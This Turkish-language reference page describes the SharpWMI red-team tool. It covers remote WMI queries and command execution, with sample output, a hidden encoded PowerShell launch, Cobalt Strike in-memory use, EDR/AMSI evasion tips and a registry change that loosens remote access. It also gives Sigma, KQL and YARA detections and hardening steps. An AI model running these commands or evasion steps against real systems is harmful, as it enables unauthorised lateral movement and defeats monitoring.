# SharpWMI

> **Kategori:** [11. Yanal Hareket ve Uzak Kod Yürütme](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** GhostPack araç setine ait, C# ile geliştirilmiş, .NET CLR üzerinden DCOM/WMI çağrılarıyla uzak sistemlerde WQL sorguları çalıştıran ve `Win32_Process.Create` ile kod yürüten kırmızı takım aracı.

---

## 1. Genel Bakış ve Amaç

Active Directory ortamlarında Windows Management Instrumentation (WMI), sistem yöneticilerinin uzaktan yönetim, envanter çıkarma ve otomasyon görevleri için kullandığı yerleşik bir yönetim omurgasıdır. WMI'ın sunduğu bu meşru imkanlar, kırmızı takım operasyonlarında ve güvenlik denetimlerinde yanal hareket (lateral movement) ve bilgi toplama aşamalarında kritik bir vektör oluşturur.

Geleneksel `wmic.exe` komut satırı aracı veya PowerShell tabanlı WMI komutları (`Get-WmiObject`, `Invoke-CimMethod`), modern EDR sensörleri ve PowerShell Script Block Logging (Event ID 4104) tarafından yüksek hassasiyetle izlenir. **SharpWMI**, Will Schroeder (HarmJ0y) tarafından C# ile geliştirilmiş olup doğrudan .NET `System.Management` kütüphanelerini kullanarak WMI DCOM arabirimleriyle konuşur. Bu yaklaşım, PowerShell süreçlerini başlatmadan ve `wmic.exe` ikilisini çağırmadan hedef sistemlerle RPC/DCOM (TCP 135 ve dinamik RPC portları) üzerinden doğrudan haberleşilmesini sağlar.

### Mimari Akış Şeması

```
+-----------------------------------------------------------------------------------+
|                              SHARPWMI MIMARI AKIŞI                                |
+-----------------------------------------------------------------------------------+
  [Denetim Makinesi / C2]                            [Hedef Windows Sunucusu]
    (SharpWMI.exe / CLR)                                (DCOM / WMI Servisi)
             |                                                    |
             |--- 1. RPC Endpoint Mapper (TCP 135) -------------->|
             |       [DCOM Interface Bind Talebi: IRemoteSCMActivator]
             |                                                    |--- 2. Dinamik RPC Portu
             |<-- 2. Dinamik Yüksek Port Yanıtı (TCP 49152-65535)-|       Tahsis Edilir
             |                                                    |
             |--- 3. IWbemLevel1Login::NTLMLogin (DCOM/RPC) ----->|--- 3. WMI Yetkilendirmesi
             |       [root\cimv2 Namespace Bağlantısı]            |       (svchost.exe)
             |                                                    |
             |--- 4. IWbemServices::ExecMethod (Win32_Process)--->|--- 4. WMI Sağlayıcı
             |       [Create(CommandLine, CurrentDirectory)]      |       (wmiprvse.exe)
             |                                                    |
             |                                                    |--- 5. Alt Proses Başlatılır
             |                                                    |       cmd.exe / process
             |<-- 6. RPC Return Value (0 = Success, ProcessID)---|
```

### Neden Önemli?

| Yetenek | Operasyonel Avantaj | Alternatif Araçlara Üstünlüğü |
| :--- | :--- | :--- |
| **Doğrudan .NET WMI API** | `wmic.exe` veya `powershell.exe` süreçlerini çağırmaz. | Proses oluşturma tabanlı EDR kurallarını atlatır. |
| **Bellekte Yürütme (C2)** | `execute-assembly` ile doğrudan RAM'de çalıştırılabilir. | Diske hiçbir çalıştırılabilir dosya yazılmaz. |
| **Çift Yönlü Fonksiyonellik**| Hem WQL sorgulama (`query`) hem kod yürütme (`exec`) yapar. | Bilgi toplama ve yanal hareketi tek araçta birleştirir. |
| **WMI Event Desteği** | Kalıcılık denetimleri için event subscription oluşturabilir. | Gelişmiş saldırı senaryolarının simülasyonunu sağlar. |
| **Kimlik Bilgisi Geçişi** | Mevcut oturum belirtecini (Token) veya açık parolayı kullanır. | Esnek etki alanı kimlik doğrulama modelleri sunar. |

### Karşılaştırma Tablosu

| Özellik | SharpWMI | impacket-wmiexec | wmic.exe (Yerleşik) | PowerShell (Get-CimInstance) |
| :--- | :--- | :--- | :--- | :--- |
| **Geliştirme Dili** | C# (.NET Framework) | Python (Impacket) | Yerleşik Windows C++ Binary | PowerShell / C# |
| **Çalıştırma Ortamı** | Windows (.NET / C2) | Linux / Windows | Windows Yerel | Windows Yerel |
| **Çıktı Alma Mekanizması** | RPC Dönüş Kodu / Konsol | SMB Paylaşımı (.txt dosyası) | Konsol (Stdout) | PowerShell Nesnesi |
| **SMB (Port 445) Zorunluluğu**| Hayır (Sadece RPC/WMI) | Evet (Çıktı okumak için) | Hayır | Hayır |
| **PowerShell İmzası** | Yok (Saf .NET DCOM) | Yok | Yok | Var (Script Logging tetikler) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

SharpWMI komut satırından anahtar-değer çiftleri formatında (`action=`, `computername=`, `command=`) çalıştırılır:

```cmd
SharpWMI.exe action=<exec|query|create> [parametre=değer ...]
```

### Desteklenen Kritik Bayraklar

| Parametre | Açıklama | Kabul Ettiği Değerler / Örnek |
| :--- | :--- | :--- |
| `action` | Gerçekleştirilecek temel operasyon türü (Zorunlu). | `query`, `exec`, `create` |
| `computername` | Hedef sistemin IP adresi, NetBIOS adı veya FQDN değeri. | `192.168.1.50`, `DC01.corp.local` |
| `query` | Çalıştırılacak WQL (WMI Query Language) sorgusu (`action=query`). | `Select * from Win32_OperatingSystem` |
| `command` | Hedef sistemde yürütülecek komut satırı dizesi (`action=exec`). | `cmd.exe /c whoami > C:\temp\out.txt` |
| `username` | Yetkilendirmede kullanılacak kullanıcı adı (Opsiyonel). | `Administrator`, `corp\admin` |
| `password` | Yetkilendirmede kullanılacak düz metin parola (Opsiyonel). | `P@ssw0rd2026!` |
| `domain` | Kullanıcının ait olduğu etki alanı adı (Opsiyonel). | `CORP` veya `corp.local` |
| `namespace` | Bağlanılacak WMI isim alanı (Varsayılan: `root\cimv2`). | `root\cimv2`, `root\subscription` |
| `eventname` | WMI Event Consumer/Filter için kalıcılık adı (`action=create`). | `SecurityHealthCheck` |
| `script` | WMI Event çalıştırıldığında tetiklenecek betik veya komut. | `C:\Windows\Temp\agent.exe` |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Uzak Sistemden İşletim Sistemi ve Mimari Bilgisi Sorgulama
Hedef makinede hangi Windows sürümünün, derleme numarasının ve servis paketinin çalıştığını öğrenmek için WQL sorgusu yürütme:

```cmd
SharpWMI.exe action=query computername=192.168.1.100 query="SELECT Caption, Version, BuildNumber, OSArchitecture FROM Win32_OperatingSystem"
```

**Konsol Çıktı Analizi:**
```
[+] SharpWMI - GhostPack
[*] Action: query
[*] Host: 192.168.1.100
[*] Query: SELECT Caption, Version, BuildNumber, OSArchitecture FROM Win32_OperatingSystem

Caption        : Microsoft Windows Server 2022 Standard
Version        : 10.0.20348
BuildNumber    : 20348
OSArchitecture : 64-bit

[+] Query completed successfully.
```

### Senaryo 2: Uzak Sistemde Kurulu Antivirüs / Güvenlik Yazılımlarını Listeleme
Uç nokta koruma durumunu analiz etmek amacıyla `root\SecurityCenter2` isim alanını sorgulama:

```cmd
SharpWMI.exe action=query computername=192.168.1.105 namespace="root\SecurityCenter2" query="SELECT displayName, productState FROM AntiVirusProduct"
```

**Konsol Çıktı Analizi:**
```
[*] Host: 192.168.1.105
[*] Namespace: root\SecurityCenter2
[*] Query: SELECT displayName, productState FROM AntiVirusProduct

displayName  : Windows Defender
productState : 397568

displayName  : CrowdStrike Falcon Sensor
productState : 266240

[+] Security software identified.
```

### Senaryo 3: Uzak Sistemde `Win32_Process.Create` ile Komut Yürütme
Yetkili oturum belirteci (Token) bağlamında hedef sunucuda arka planda komut çalıştırma:

```cmd
SharpWMI.exe action=exec computername=192.168.1.50 command="powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA..."
```

**Konsol Çıktı Analizi:**
```
[+] SharpWMI - GhostPack
[*] Action: exec
[*] Host: 192.168.1.50
[*] Command: powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...

[*] Invoking Win32_Process.Create on 192.168.1.50...
[+] Process created successfully! Process ID: 4892
[+] Return value: 0 (Success)
```

### Senaryo 4: Farklı Etki Alanı Kimlik Bilgileri (Explicit Credentials) ile Yürütme
Mevcut süreç etki alanı üyesi olmayan bir makinede veya farklı bir kullanıcının bağlamında çalışırken kimlik bilgisi belirterek komut çalıştırma:

```cmd
SharpWMI.exe action=exec computername=192.168.1.50 username=svc_backup password=BackupMasterPass! domain=corp.local command="cmd.exe /c net localgroup administrators"
```

**Konsol Çıktı Analizi:**
```
[*] Connecting to 192.168.1.50 with credentials (corp.local\svc_backup)...
[*] Authenticated successfully via DCOM/RPC.
[*] Executing Win32_Process.Create...
[+] Process created successfully! Process ID: 6120
[+] Return value: 0
```

### Senaryo 5: Uzak Sistemdeki Servis Durumlarını Listeleme
Hedef sunucudaki kritik servislerin (örn. Spooler, WinRM, EDR servisleri) çalışma durumunu denetleme:

```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT Name, DisplayName, State, StartMode FROM Win32_Service WHERE State='Running'"
```

**Konsol Çıktı Analizi:**
```
Name        : Spooler
DisplayName : Print Spooler
State       : Running
StartMode   : Auto

Name        : WinRM
DisplayName : Windows Remote Management (WS-Management)
State       : Running
StartMode   : Auto
```

### Senaryo 6: Cobalt Strike / C2 `execute-assembly` Entegrasyonu
SharpWMI derlenmiş `.exe` dosyasını diskte dosya bırakmadan hedef iş istasyonunun belleğinde yürütme:

```
beacon> execute-assembly /opt/GhostPack/SharpWMI.exe action=exec computername=fs01.corp.local command="whoami"
```

**Beacon Konsol Çıktısı:**
```
[*] Tasked beacon to run assembly: SharpWMI.exe action=exec computername=fs01.corp.local command="whoami"
[+] host called home, sent: 68096 bytes
[+] Process created successfully! Process ID: 3108
[+] Return value: 0 (Success)
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Kök Neden | Kesin Çözüm Adımı |
| :--- | :--- | :--- |
| `0x80070005 (E_ACCESSDENIED)` | Hedef sistemde DCOM veya WMI erişim yetkisi yetersiz; yerel hesapta `LocalAccountTokenFilterPolicy` kısıtlaması aktif. | Hedef kullanıcının yerel `Administrators` grubunda olduğunu doğrulayın veya `reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1` değerini uygulayın. |
| `0x800706BA (RPC_S_SERVER_UNAVAILABLE)` | Hedef sunucuda TCP 135 portu veya dinamik RPC port aralığı (49152-65535) Windows Güvenlik Duvarı tarafından engelleniyor. | Güvenlik duvarında "Windows Management Instrumentation (WMI)" gelen kural grubunun açık olduğunu ve RPC Endpoint Mapper bağlantısını doğrulayın. |
| `0x80041003 (WBEM_E_ACCESS_DENIED)` | WMI Namespace seviyesinde (örn: `root\cimv2` veya `root\subscription`) geçerli kullanıcının "Remote Enable" izni bulunmuyor. | `wmimgmt.msc` konsolunda Namespace Güvenliği sekmesinden ilgili kullanıcı/gruba "Remote Enable" ve "Execute Methods" yetkisi verin. |
| `0x80041010 (WBEM_E_INVALID_CLASS)` | Sorgulanan WMI sınıfı sistemde kayıtlı değil veya yanlış namespace belirtilmiş (örn: sunucu işletim sisteminde `SecurityCenter2` bulunmaz). | Sınıf adını ve namespace parametresini hedef işletim sistemi sürümüne (Client vs Server) göre doğrulayın. |
| `Return Value: 2 (Access Denied inside Process.Create)` | DCOM oturumu açıldı ancak kullanıcının yeni süreç başlatma token ayrıcalıkları yetersiz. | Komutu çalıştıran hesabın hedef makinede SeAssignPrimaryTokenPrivilege veya tam yönetici hakkına sahip olduğunu kontrol edin. |
| `System.IO.FileNotFoundException: System.Management` | Hedef sistemde veya çalıştırma ortamında uygun .NET Framework sürümü eksik veya bozuk. | Hedefte .NET Framework 3.5 veya 4.x kurulu olduğunu teyit edin; ikiliyi doğru CLR sürümüne (`/clr:4.0`) göre derleyin. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

```
[OPSEC GÜRÜLTÜ SKALASI: ORTA]
0 --------------[6.0 - WMI PROCESS & RPC HIGH PORTS]-------------- 10
  - Ağ Seviyesi: TCP 135 ve dinamik RPC portları (Meşru yönetimsel trafiğe benzer)
  - Uç Nokta Seviyesi: wmiprvse.exe alt proses zinciri (EDR sensörleri için birincil tespit alanı)
```

### 5.1 Bırakılan İzler (Event Logs)

* **Windows Security Event ID 4624 (Başarılı Ağ Oturumu):**
  * `Logon Type: 3` (Network Logon) olarak kaydedilir.
  * Kimlik doğrulama paketi: `NTLM` veya `Kerberos`.
* **Microsoft-Windows-WMI-Activity/Operational:**
  * **Event ID 5857:** WMI sağlayıcısının (`Provider`) başlatıldığını belirtir (`Win32_Provider` başlatılması).
  * **Event ID 5858:** Hata oluşan WMI sorgularını ve hata kodlarını kaydeder (Erişim reddi tespiti için kritiktir).
  * **Event ID 5861:** WMI Event Consumer oluşturulduğunda kaydedilir (`action=create` kalıcılık denetimlerinde tetiklenir).
* **Microsoft-Windows-Security-Auditing / Sysmon Event ID 1 (Process Creation):**
  * Parent Image: `C:\Windows\System32\wbem\WmiPrvSE.exe`
  * CommandLine: `wmiprvse.exe` tarafından başlatılan komut satırı (`cmd.exe /c ...`).

### 5.2 Ağ ve EDR İmzaları

* **Proses Ağacı Anomalisi:**
  Meşru yazılımlar genellikle `wmiprvse.exe` altından etkileşimli komut kabukları (`cmd.exe`, `powershell.exe`) başlatmaz. EDR sensörleri `ParentProcessName == "wmiprvse.exe"` ve `ProcessName in ("cmd.exe", "powershell.exe", "cscript.exe")` ilişkisini anında şüpheli yanal hareket aktivitesi olarak işaretler.
* **Ağ İletişimi:**
  Hedefe doğru önce TCP 135 portuna SYN paketi gönderilir, ardından port eşleyici tarafından belirlenen dinamik port (örneğin TCP 49158) üzerinden DCE/RPC trafiği akar.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
| :--- | :--- | :--- | :--- |
| **Execution** | `T1047` | Windows Management Instrumentation | WMI nesneleri üzerinden kod çalıştırma ve durum sorgulama. |
| **Lateral Movement** | `T1021.002` | Remote Services | Ağ üzerinden uzaktaki WMI servisiyle etkileşime girme. |
| **Discovery** | `T1082` | System Information Discovery | WQL sorguları ile işletim sistemi, donanım ve yazılım envanteri çıkarma. |
| **Persistence** | `T1546.003` | Event Triggered Execution: WMI Event Subscription | Sistem olaylarına bağlı kalıcı tetikleyiciler oluşturma. |

### 5.4 OPSEC Önerileri

| Tespit Riski | Önlem / İyileştirme |
| :--- | :--- |
| **`wmiprvse.exe -> cmd.exe` Ağacı** | Komutları doğrudan `cmd.exe` veya `powershell.exe` ile çalıştırmak yerine DLL yükleme veya meşru ikilileri argümanlarla çağırma tercih edilmelidir. |
| **Düz Metin Komut Argümanları** | Hassas komutlar komut satırında açıkça geçirilmemeli; Base64 veya şifreli parametre blokları kullanılmalıdır. |
| **Açık RPC Port Taraması** | Hedefin RPC portları körlemesine taranmamalı; yalnızca hedeflenen sistemlere doğrudan DCOM bağlantısı açılmalıdır. |
| **Bellekte .NET İmzası (AMSİ/ETW)** | `execute-assembly` kullanılırken ETW patching ve AMSI bypass mekanizmaları belleğe önceden enjekte edilmelidir. |

### 5.5 Savunma Karşılığı

#### Sigma Kuralı: WMI Üzerinden Şüpheli Proses Başlatılması
```yaml
title: WmiPrvSE Tarafindan Supheli Komut Kabugu Baslatilmasi
id: e4b81c20-4b92-4f9e-bc82-9a84210dfc44
status: experimental
description: SharpWMI veya wmic kaynakli Win32_Process.Create aktivitelerini tespit eder.
references:
    - https://attack.mitre.org/techniques/T1047/
author: Active Directory Guvenlik Ekibi
date: 2026/10/14
logsource:
    category: process_creation
    product: windows
detection:
    selection:
        ParentImage|endswith: '\WmiPrvSE.exe'
        Image|endswith:
            - '\cmd.exe'
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\mshta.exe'
            - '\cscript.exe'
            - '\wscript.exe'
    condition: selection
falsepositives:
    - SCCM istemci envanter scriptleri (nadiren cmd.exe cagirabilir).
level: high
tags:
    - attack.execution
    - attack.t1047
```

#### Microsoft Sentinel KQL Sorgusu
```kql
// WmiPrvSE tarafindan baslatilan supheli surecleri ve iliskili ag baglantilarini tespit eder
DeviceProcessEvents
| where InitiatingProcessFileName =~ "wmiprvse.exe"
| where FileName in~ ("cmd.exe", "powershell.exe", "powershell_ise.exe", "certutil.exe", "rundll32.exe")
| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine, AccountName
| order by TimeGenerated desc
```

#### YARA Kuralı: SharpWMI .NET Assembly İmzası
```yara
rule Threat_Tool_SharpWMI {
    meta:
        description = "SharpWMI GhostPack derlenmis C# binary imzalarini yakalar"
        author = "AD Guvenlik Arastirma Laboratuvari"
        date = "2026-10-14"
        severity = "High"
    strings:
        $s1 = "SharpWMI" ascii wide nocase
        $s2 = "action=exec" ascii wide nocase
        $s3 = "action=query" ascii wide nocase
        $s4 = "Win32_Process" ascii wide
        $s5 = "root\\cimv2" ascii wide nocase
    condition:
        uint16(0) == 0x5A4D and (3 of ($s*))
}
```

#### Sertleştirme (Hardening) Adımları
1. **DCOM Uzak Başlatma Kısıtlamaları:** `dcomcnfg` üzerinden "Remote Activation" ve "Remote Access" yetkileri yalnızca özel yönetim gruplarına verilmeli; standart Domain Users kısıtlanmalıdır.
2. **WMI Güvenlik Duvarı Kuralları:** İstemci (workstation) ağlarında TCP 135 ve WMI dinleyicileri güvenlik duvarı politikalarıyla devre dışı bırakılmalıdır.
3. **WMI Günlükleme Denetimi:** `Microsoft-Windows-WMI-Activity/Operational` günlüğü etki alanı genelinde etkinleştirilmeli ve SIEM sistemine yönlendirilmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Cheat Sheet)

#### 1. Uzak Sistem İşletim Sistemi Bilgisini Sorgulama
```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT Caption, Version FROM Win32_OperatingSystem"
```
* **Ne Yapar?:** Hedef sistemin işletim sistemi adı ve sürüm detaylarını çeker.
* **Ne Zaman Kullanılır?:** Yanal hareket öncesi hedef ortamın mimari analizi için.
* **Parametreler:** `action=query`, `computername=`, `query=`.

#### 2. Uzak Sistemde Komut Çalıştırma (Mevcut Token)
```cmd
SharpWMI.exe action=exec computername=192.168.1.50 command="calc.exe"
```
* **Ne Yapar?:** Mevcut kullanıcının yetki belirteciyle uzak hedefte `calc.exe` sürecini başlatır.
* **Ne Zaman Kullanılır?:** Erişim yetkilerini ve kod yürütme kabiliyetini doğrulamak için.
* **Parametreler:** `action=exec`, `command=`.

#### 3. Uzak Sistemde Antivirüs Durumunu Denetleme
```cmd
SharpWMI.exe action=query computername=192.168.1.50 namespace="root\SecurityCenter2" query="SELECT displayName FROM AntiVirusProduct"
```
* **Ne Yapar?:** Hedef istemcide çalışan AV/EDR ürünlerinin isimlerini listeler.
* **Ne Zaman Kullanılır?:** Yanal hareket aşamasında EDR engellerini önceden tespit etmek için.
* **Parametreler:** `namespace=root\SecurityCenter2`.

#### 4. Açık Kimlik Bilgileri ile Uzak Kod Çalıştırma
```cmd
SharpWMI.exe action=exec computername=192.168.1.50 username=admin password=SecretPassword! domain=corp command="cmd.exe /c whoami"
```
* **Ne Yapar?:** Belirtilen kullanıcı adı, parola ve domain ile DCOM oturumu kurarak komut çalıştırır.
* **Ne Zaman Kullanılır?:** Yerel hesap belirtecinin geçerli olmadığı veya farklı domain hesapları test edildiğinde.
* **Parametreler:** `username=`, `password=`, `domain=`.

#### 5. Uzak Sistemdeki Çalışan Prosesleri Listeleme
```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT ProcessId, Name, ExecutablePath FROM Win32_Process"
```
* **Ne Yapar?:** Hedef sunucuda aktif tüm süreçleri ve dosya yollarını WQL ile listeler.
* **Ne Zaman Kullanılır?:** Hedefte çalışan güvenlik ve izleme ajanlarını keşfetmek için.
* **Parametreler:** `query="SELECT ... FROM Win32_Process"`.

#### 6. Uzak Sistemde Servis Durumlarını İnceleme
```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT Name, State FROM Win32_Service WHERE StartMode='Auto'"
```
* **Ne Yapar?:** Otomatik başlayan servisleri ve mevcut durumlarını raporlar.
* **Ne Zaman Kullanılır?:** Yetki yükseltme veya servis manipülasyonu analizlerinde.
* **Parametreler:** `query="... Win32_Service ..."`.

#### 7. Ağ Adaptörü ve Yapılandırmasını Sorgulama
```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT Description, IPAddress, DefaultIPGateway FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled=TRUE"
```
* **Ne Yapar?:** Aktif ağ kartlarının IP adreslerini ve ağ geçitlerini görüntüler.
* **Ne Zaman Kullanılır?:** Ağ topolojisini ve çoklu bacaklı (dual-homed) sunucuları tespit etmek için.
* **Parametreler:** `query="... Win32_NetworkAdapterConfiguration ..."`.

#### 8. Uzak Sistemde Oturum Açmış Kullanıcıları Listeleme
```cmd
SharpWMI.exe action=query computername=192.168.1.50 query="SELECT LogonId, StartTime FROM Win32_LogonSession"
```
* **Ne Yapar?:** Hedef sistemde aktif oturum kimliklerini ve başlangıç saatlerini döker.
* **Ne Zaman Kullanılır?:** Yetkili kullanıcı oturumlarını takip etmek için.
* **Parametreler:** `query="SELECT ... FROM Win32_LogonSession"`.

#### 9. Komut Çıktısını Geçici Dosyaya Yönlendirerek Çalıştırma
```cmd
SharpWMI.exe action=exec computername=192.168.1.50 command="cmd.exe /c ipconfig /all > C:\Windows\Temp\ip.txt"
```
* **Ne Yapar?:** Komut çıktısını hedef diske yönlendirir (SharpWMI stdout döndürmediği için).
* **Ne Zaman Kullanılır?:** Komutun ürettiği bilgileri daha sonra okumak gerektiğinde.
* **Parametreler:** `command="cmd.exe /c ... > C:\temp\file"`.

#### 10. Cobalt Strike / C2 `execute-assembly` ile Bellekte Çalıştırma
```
execute-assembly SharpWMI.exe action=query computername=10.0.0.1 query="SELECT Name FROM Win32_ComputerSystem"
```
* **Ne Yapar?:** Aracı diske yazmadan Beacon sürecinin belleğinde yürüterek WQL sonucunu getirir.
* **Ne Zaman Kullanılır?:** EDR dosya tarama mekanizmalarını tamamen bertaraf etmek için.
* **Parametreler:** Beacon konsol komutu.

---

## Kaynaklar
* [GhostPack SharpWMI Resmi GitHub Deposu](https://github.com/GhostPack/SharpWMI)
* [Microsoft Dokümantasyonu: WMI Architecture and Providers](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-architecture)
* [Microsoft Dokümantasyonu: [MS-WMI] Windows Management Instrumentation Remote Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-wmi/)
* [MITRE ATT&CK: Windows Management Instrumentation (T1047)](https://attack.mitre.org/techniques/T1047/)
* [SpecterOps: Understanding WMI and Remote Code Execution](https://posts.specterops.io/)
* [HackTricks: Pentesting WMI](https://book.hacktricks.xyz/windows-hardening/lateral-movement#wmi-windows-management-instrumentation)

---

> **Önceki:** [← Evil-WinRM](./Evil-WinRM.md) · **Sonraki:** [WMIHacker →](./WMIHacker.md)
